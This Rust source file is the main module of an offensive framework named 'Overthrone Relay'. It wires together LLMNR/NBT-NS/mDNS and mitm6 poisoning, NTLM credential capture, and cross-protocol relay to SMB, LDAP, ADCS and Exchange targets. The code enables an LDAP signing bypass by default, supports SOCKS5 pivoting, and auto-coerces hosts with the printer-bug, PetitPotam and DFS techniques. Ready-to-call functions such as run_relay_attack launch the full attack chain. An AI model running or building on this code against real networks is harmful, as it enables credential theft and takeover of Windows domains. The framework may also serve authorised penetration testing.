//! Overthrone Relay — NTLM Relay and Responder Framework
//!
//! Implements LLMNR/NBT-NS poisoning and NTLM relay attacks
//! for credential capture and relay to other services.

pub mod adcs_relay;
pub mod exchange;
pub mod http_relay;
pub mod mitm6;
pub mod poisoner;
pub mod relay;
pub mod responder;
pub mod smb_daemon;
pub mod utils;

// Re-export types from submodules
pub use adcs_relay::{AdcsRelay, AdcsRelayConfig};
pub use http_relay::{HttpRelay, HttpRelayConfig};
pub use relay::RelayStats;
pub use responder::CapturedCredential;
pub use smb_daemon::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
// Re-export RelayError from overthrone_core
pub use overthrone_core::error::RelayError;
use overthrone_core::error::Result;
use overthrone_core::proto::{trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::Mutex as TokioMutex;
use tracing::{info, warn};

/// Protocol for relay targets
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Protocol {
    /// `Smb` variant
    Smb,
    /// `Http` variant
    Http,
    /// `Https` variant
    Https,
    /// `Ldap` variant
    Ldap,
    /// `Ldaps` variant
    Ldaps,
    /// `Mssql` variant
    Mssql,
    /// `Webdav` variant (HTTP-based, used by ShadowCoerce)
    Webdav,
    /// `Msmq` variant (Microsoft Message Queuing, port 1801)
    Msmq,
    /// `Exchange` variant (MAPI-over-HTTP / EWS, CVE-2024-21410)
    Exchange,
}

impl std::fmt::Display for Protocol {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Smb => write!(f, "SMB"),
            Self::Http => write!(f, "HTTP"),
            Self::Https => write!(f, "HTTPS"),
            Self::Ldap => write!(f, "LDAP"),
            Self::Ldaps => write!(f, "LDAPS"),
            Self::Mssql => write!(f, "MSSQL"),
            Self::Webdav => write!(f, "WebDAV"),
            Self::Msmq => write!(f, "MSMQ"),
            Self::Exchange => write!(f, "Exchange"),
        }
    }
}

/// Attack mode for responder/relay
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AttackMode {
    /// `Capture` variant
    Capture,
    /// `Relay` variant
    Relay,
    /// `SmbRelay` variant
    SmbRelay,
    /// `HttpRelay` variant
    HttpRelay,
}

/// NTLM challenge structure
#[derive(Debug, Clone)]
pub struct NtlmChallenge {
    /// Raw byte data
    pub data: Vec<u8>,
    /// Target server name
    pub target_name: String,
}

/// NTLM response structure
#[derive(Debug, Clone)]
pub struct NtlmResponse {
    /// Username for authentication
    pub username: String,
    /// Domain FQDN
    pub domain: String,
    /// LM response data
    pub lm_response: Vec<u8>,
    /// NT response data
    pub nt_response: Vec<u8>,
}

/// Relay target specification
#[derive(Debug, Clone)]
pub struct RelayTarget {
    /// Network address (IP:port)
    pub address: SocketAddr,
    /// Network protocol variant
    pub protocol: Protocol,
    /// Username for authentication
    pub username: Option<String>,
}

/// Controller state
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub enum ControllerState {
    /// Controller has not been initialized
    #[default]
    Initial,
    /// Controller is running
    Running,
    /// Controller is stopped
    Stopped,
    /// Controller encountered an error
    Error(String),
}

/// Main relay controller that coordinates poisoner and relay components.
///
/// The relay is wrapped in `Arc<TokioMutex<>>` so it can be shared with the
/// responder's HTTP server for asymmetric relay (e.g., HTTP -> SMB).
pub struct RelayController {
    config: RelayControllerConfig,
    _state: ControllerState,
    poisoner: Option<poisoner::Poisoner>,
    mitm6: Option<mitm6::Mitm6>,
    responder: Option<responder::Responder>,
    relay: Option<Arc<TokioMutex<relay::NtlmRelay>>>,
    http_relay: Option<http_relay::HttpRelay>,
}

#[derive(Debug, Clone)]
/// Data structure used by this module.
pub struct RelayControllerConfig {
    /// Interface to listen on (e.g., "eth0", "0.0.0.0")
    pub interface: String,
    /// Enable LLMNR poisoning
    pub llmnr: bool,
    /// Enable NBT-NS poisoning
    pub nbtns: bool,
    /// Enable mDNS poisoning
    pub mdns: bool,
    /// Enable DHCPv6 DNS poisoning (mitm6)
    pub mitm6: bool,
    /// Enable responder for credential capture
    pub responder: bool,
    /// Enable relay to targets
    pub relay_targets: Vec<RelayTarget>,
    /// Challenge to use for NTLM authentication (hex string)
    pub challenge: Option<String>,
    /// WPAD proxy script to serve
    pub wpad_script: Option<String>,
    /// Force authentication downgrade
    pub downgrade_auth: bool,
    /// If `true`, skip all poisoning/responder components.
    /// Useful when pre-captured hashes are fed externally — relay only mode.
    pub no_poison: bool,
    /// Enable LDAP signing bypass (CVE-2019-1040).
    /// Strips SIGN/SEAL/ALWAYS_SIGN flags and channel bindings from
    /// NTLM challenge/authenticate during LDAP/LDAPS relay.
    pub ldap_signing_bypass: bool,
    /// Optional mTLS client identity for outbound TLS connections.
    pub tls_client_identity: Option<crate::relay::TlsIdentity>,
    /// Optional SOCKS5 proxy for outbound relay connections (format: `host:port`).
    /// When set, all outbound NTLM relay connections route through this SOCKS5 proxy
    /// instead of connecting directly. Useful for pivoting through a compromised host.
    pub socks5_proxy: Option<String>,
    /// Hosts to automatically coerce into authenticating to this relay.
    /// Each host will be targeted with printer-bug, petitpotam, and DFS coercion.
    pub auto_coerce_targets: Vec<String>,
    /// IP address that coerced targets should connect back to.
    /// Typically the relay's own IP on the target network.
    /// Required when `auto_coerce_targets` is non-empty.
    pub auto_coerce_listener: Option<String>,
    /// Configuration for standalone HTTP asymmetric relay listener.
    /// When set, starts an HTTP listener that relays captured NTLM tokens
    /// to the configured target protocols (SMB, LDAP, etc.).
    /// Independent of the responder/poisoner — useful when coerced auth
    /// lands directly on HTTP and needs to pivot to SMB.
    pub http_relay_config: Option<HttpRelayConfig>,
}

impl Default for RelayControllerConfig {
    fn default() -> Self {
        Self {
            interface: "::".to_string(),
            llmnr: true,
            nbtns: true,
            mdns: false,
            mitm6: false,
            responder: true,
            relay_targets: Vec::new(),
            challenge: None,
            wpad_script: None,
            downgrade_auth: false,
            no_poison: false,
            ldap_signing_bypass: true,
            tls_client_identity: None,
            socks5_proxy: None,
            auto_coerce_targets: Vec::new(),
            auto_coerce_listener: None,
            http_relay_config: None,
        }
    }
}

impl RelayController {
    /// Create a new relay controller with the given configuration
    pub fn new(config: RelayControllerConfig) -> Self {
        Self {
            config,
            _state: ControllerState::Initial,
            poisoner: None,
            mitm6: None,
            responder: None,
            relay: None,
            http_relay: None,
        }
    }

    /// Initialize all components based on configuration
    pub async fn initialize(&mut self) -> Result<()> {
        info!(
            "Initializing relay controller on interface: {}",
            self.config.interface
        );

        // Initialize poisoner if enabled (skipped in no-poison / relay-only mode)
        if !self.config.no_poison && (self.config.llmnr || self.config.nbtns || self.config.mdns) {
            let poisoner_config = poisoner::PoisonerConfig {
                listen_ip: self.config.interface.clone(),
                poison_ip: self.config.interface.clone(),
                attack_mode: AttackMode::Capture,
                timeout: 30,
                llmnr: self.config.llmnr,
                nbtns: self.config.nbtns,
                mdns: self.config.mdns,
                analyze_only: false,
                target_hosts: Vec::new(),
            };
            self.poisoner = Some(poisoner::Poisoner::new(poisoner_config)?);
            info!("Poisoner initialized");
        }

        // Initialize mitm6 if enabled
        if !self.config.no_poison && self.config.mitm6 {
            let mitm6_config = mitm6::Mitm6Config {
                listen_ip: "::".to_string(),
                ..mitm6::Mitm6Config::default()
            };
            self.mitm6 = Some(mitm6::Mitm6::new(mitm6_config));
            info!("mitm6 initialized");
        }

        // Initialize responder if enabled (skipped in no-poison / relay-only mode)
        if !self.config.no_poison && self.config.responder {
            let responder_config = responder::ResponderConfig {
                listen_ip: self.config.interface.clone(),
                challenge: self.config.challenge.clone(),
                http: true,
                smb: true,
                ldap: true,
                msmq: false,
            };
            self.responder = Some(responder::Responder::new(responder_config));
            info!("Responder initialized for credential capture");
        }

        // Initialize relay if targets specified
        if !self.config.relay_targets.is_empty() {
            let relay_config = relay::RelayConfig {
                listen_ip: self.config.interface.clone(),
                targets: self.config.relay_targets.clone(),
                round_robin: true,
                remove_on_success: true,
                timeout_secs: 30,
                ldap_signing_bypass: self.config.ldap_signing_bypass,
                max_retries: 3,
                max_connections: 64,
                tls_client_identity: self.config.tls_client_identity.clone(),
                socks5_proxy: self.config.socks5_proxy.clone(),
            };
            let ntlm_relay = relay::NtlmRelay::new(relay_config);
            let relay_arc = Arc::new(TokioMutex::new(ntlm_relay));

            // Wire the responder bridge for asymmetric relay (e.g., HTTP -> SMB).
            // The responder's HTTP server will forward NTLM tokens through the
            // relay engine, enabling cross-protocol relay from any responder
            // listener to any target protocol.
            if let Some(ref mut responder) = self.responder {
                responder.set_relay(relay_arc.clone(), tokio::runtime::Handle::current());
                info!("Responder bridge wired for asymmetric relay");
            }

            info!(
                "NTLM relay initialized with {} target(s)",
                self.config.relay_targets.len()
            );
            self.relay = Some(relay_arc);
        }

        // Initialize standalone HTTP relay if configured
        if let Some(ref http_config) = self.config.http_relay_config {
            let http_relay = http_relay::HttpRelay::new(http_config.clone());
            info!(
                "HTTP asymmetric relay initialized with {} target(s)",
                http_config.targets.len()
            );
            self.http_relay = Some(http_relay);
        }

        Ok(())
    }

    /// Start all enabled services
    pub async fn start(&mut self) -> Result<()> {
        info!("Starting relay controller services...");

        if let Some(ref mut poisoner) = self.poisoner {
            poisoner.start().await?;
            info!("Poisoner started");
        }

        if let Some(ref mut mitm6) = self.mitm6 {
            mitm6.start().await?;
            info!("mitm6 started");
        }

        if let Some(ref mut responder) = self.responder {
            responder.start().await?;
            info!("Responder started");
        }

        if let Some(ref relay) = self.relay {
            let mut guard = relay.lock().await;
            guard.start().await?;
            info!("NTLM relay started");
        }

        if let Some(ref mut http_relay) = self.http_relay {
            http_relay.start().await?;
            info!("HTTP asymmetric relay started");
        }

        info!("All services started successfully");

        // Auto-trigger coercion against specified targets
        if !self.config.auto_coerce_targets.is_empty() {
            self.auto_coerce().await;
        }

        Ok(())
    }

    /// Automatically trigger coercion against configured targets.
    /// Runs all three techniques (printer-bug, petitpotam, DFS) against each target.
    async fn auto_coerce(&self) {
        let listener = match &self.config.auto_coerce_listener {
            Some(ip) => format!(r"\\{}\coerce", ip),
            None => {
                warn!("auto_coerce_targets is set but no auto_coerce_listener — skipping coercion");
                return;
            }
        };

        info!(
            "Auto-coercing {} target(s) to connect back to {}",
            self.config.auto_coerce_targets.len(),
            listener
        );

        for target in &self.config.auto_coerce_targets {
            info!("Coercing {}", target);
            for technique in &["printer-bug", "petitpotam", "dfs-coerce"] {
                let result = match *technique {
                    "printer-bug" => trigger_printer_bug(target, &listener).await,
                    "petitpotam" => trigger_petitpotam(target, &listener).await,
                    "dfs-coerce" => trigger_dfs_coerce(target, &listener).await,
                    _ => unreachable!(),
                };
                match result {
                    Ok(r) if r.success => {
                        info!("[{}] {} succeeded", target, technique);
                    }
                    Ok(r) => {
                        warn!("[{}] {} failed: {}", target, technique, r.message);
                    }
                    Err(e) => {
                        warn!("[{}] {} error: {}", target, technique, e);
                    }
                }
            }
        }
    }

    /// Stop all services
    pub async fn stop(&mut self) -> Result<()> {
        info!("Stopping relay controller services...");

        if let Some(ref mut poisoner) = self.poisoner {
            poisoner.stop().await?;
        }

        if let Some(ref mut mitm6) = self.mitm6 {
            mitm6.stop().await;
        }

        if let Some(ref mut responder) = self.responder {
            responder.stop().await?;
        }

        if let Some(ref relay) = self.relay {
            let mut guard = relay.lock().await;
            guard.stop().await?;
        }

        if let Some(ref mut http_relay) = self.http_relay {
            http_relay.stop().await?;
        }

        info!("All services stopped");
        Ok(())
    }

    /// Get captured credentials from responder
    pub fn get_captured_credentials(&self) -> Vec<CapturedCredential> {
        if let Some(ref responder) = self.responder {
            responder.get_captured_credentials()
        } else {
            Vec::new()
        }
    }

    /// Get relay statistics
    pub fn get_relay_stats(&self) -> RelayStats {
        if let Some(ref relay) = self.relay {
            relay.try_lock()
                .map(|guard| guard.get_stats())
                .unwrap_or_default()
        } else {
            RelayStats::default()
        }
    }
}

/// Quick start function for common use case (poison + capture)
pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: true,
        nbtns: true,
        mdns: false,
        mitm6: false,
        responder: true,
        relay_targets: Vec::new(),
        challenge: challenge.map(|s| s.to_string()),
        wpad_script: None,
        downgrade_auth: false,
        no_poison: false,
        ldap_signing_bypass: true,
        tls_client_identity: None,
        socks5_proxy: None,
        auto_coerce_targets: Vec::new(),
        auto_coerce_listener: None,
        http_relay_config: None,
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

/// Run full relay attack (poison + capture + relay)
pub async fn run_relay_attack(
    interface: &str,
    targets: Vec<RelayTarget>,
    challenge: Option<&str>,
) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: true,
        nbtns: true,
        mdns: false,
        mitm6: false,
        responder: true,
        relay_targets: targets,
        challenge: challenge.map(|s| s.to_string()),
        wpad_script: None,
        downgrade_auth: false,
        no_poison: false,
        ldap_signing_bypass: true,
        tls_client_identity: None,
        socks5_proxy: None,
        auto_coerce_targets: Vec::new(),
        auto_coerce_listener: None,
        http_relay_config: None,
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

pub async fn run_http_asymmetric_relay(
    interface: &str,
    listen_port: u16,
    targets: Vec<RelayTarget>,
    socks5_proxy: Option<String>,
) -> Result<RelayController> {
    let config = RelayControllerConfig {
        interface: interface.to_string(),
        llmnr: false,
        nbtns: false,
        mdns: false,
        mitm6: false,
        responder: false,
        relay_targets: Vec::new(),
        challenge: None,
        wpad_script: None,
        downgrade_auth: false,
        no_poison: true,
        ldap_signing_bypass: true,
        tls_client_identity: None,
        socks5_proxy: socks5_proxy.clone(),
        auto_coerce_targets: Vec::new(),
        auto_coerce_listener: None,
        http_relay_config: Some(HttpRelayConfig {
            listen_ip: interface.to_string(),
            listen_port,
            targets,
            socks5_proxy,
            ldap_signing_bypass: true,
            max_retries: 3,
            timeout_secs: 30,
        }),
    };

    let mut controller = RelayController::new(config);
    controller.initialize().await?;
    controller.start().await?;

    Ok(controller)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_relay_controller_config_default() {
        let config = RelayControllerConfig::default();
        assert_eq!(config.interface, "::");
        assert!(config.llmnr);
        assert!(config.nbtns);
        assert!(!config.mdns);
        assert!(config.responder);
        assert!(config.relay_targets.is_empty());
    }

    #[test]
    fn test_relay_stats_default() {
        let stats = RelayStats::default();
        assert_eq!(
            stats
                .successful_relays
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
        assert_eq!(
            stats
                .failed_relays
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
        assert_eq!(
            stats
                .active_connections
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
        assert_eq!(
            stats
                .total_attempts
                .load(std::sync::atomic::Ordering::Relaxed),
            0
        );
    }

    #[test]
    fn test_protocol_display() {
        assert_eq!(Protocol::Smb.to_string(), "SMB");
        assert_eq!(Protocol::Http.to_string(), "HTTP");
        assert_eq!(Protocol::Https.to_string(), "HTTPS");
        assert_eq!(Protocol::Ldap.to_string(), "LDAP");
        assert_eq!(Protocol::Ldaps.to_string(), "LDAPS");
        assert_eq!(Protocol::Mssql.to_string(), "MSSQL");
        assert_eq!(Protocol::Webdav.to_string(), "WebDAV");
    }
}
